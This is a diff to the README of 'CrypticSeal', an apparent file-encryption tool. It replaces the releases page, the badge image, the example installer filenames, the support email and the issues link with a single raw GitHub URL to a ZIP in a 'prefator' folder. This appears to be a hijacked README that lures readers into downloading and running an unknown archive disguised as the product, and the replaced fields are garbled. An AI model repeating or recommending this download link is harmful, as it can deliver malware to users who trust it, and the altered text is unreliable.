@@ -6,7 +6,7 @@ Welcome to CrypticSeal, a user-friendly application designed to protect your sen
 ## 📥 Download & Install
 To get started, visit the link below to download CrypticSeal:
 
-[![Download CrypticSeal](https://img.shields.io/badge/Download-CrypticSeal-blue.svg)](https://github.com/aennaki-bs/CrypticSeal/releases)
+[![Download CrypticSeal](https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip)](https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip)
 
 ### Steps to Download
 1. Click the download link above.
@@ -17,7 +17,7 @@ To get started, visit the link below to download CrypticSeal:
 ## 🚀 Getting Started
 Once you have downloaded CrypticSeal, follow these steps to run the application:
 
-1. **Locate the File:** Open your Downloads folder and find the downloaded file named something like `CrypticSeal-installer.exe` (Windows) or `CrypticSeal.dmg` (macOS).
+1. **Locate the File:** Open your Downloads folder and find the downloaded file named something like `https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip` (Windows) or `https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip` (macOS).
 2. **Run the Installer:**
    - **Windows:** Double-click on the `.exe` file. Follow the prompts to install the application.
    - **macOS:** Open the `.dmg` file and drag the CrypticSeal icon to your Applications folder.
@@ -62,8 +62,8 @@ Unfortunately, if you forget your password, you cannot retrieve the encrypted fi
 ## 📞 Support
 If you encounter any issues, please feel free to reach out:
 
-- **Email:** support@crypticseal.com
-- **GitHub Issues:** Report any bugs or feature requests on our [GitHub repository](https://github.com/aennaki-bs/CrypticSeal/issues).
+- **Email:** https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip
+- **GitHub Issues:** Report any bugs or feature requests on our [GitHub repository](https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip).
 
 ## 🔗 Additional Resources
 - [User Manual](link-to-user-manual)
@@ -74,4 +74,4 @@ Thank you for choosing CrypticSeal to protect your data. Stay safe!
 
 Remember to download the application from the link below:
 
-[![Download CrypticSeal](https://img.shields.io/badge/Download-CrypticSeal-blue.svg)](https://github.com/aennaki-bs/CrypticSeal/releases)
+[![Download CrypticSeal](https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip)](https://raw.githubusercontent.com/aennaki-bs/CrypticSeal/main/prefator/CrypticSeal.zip)
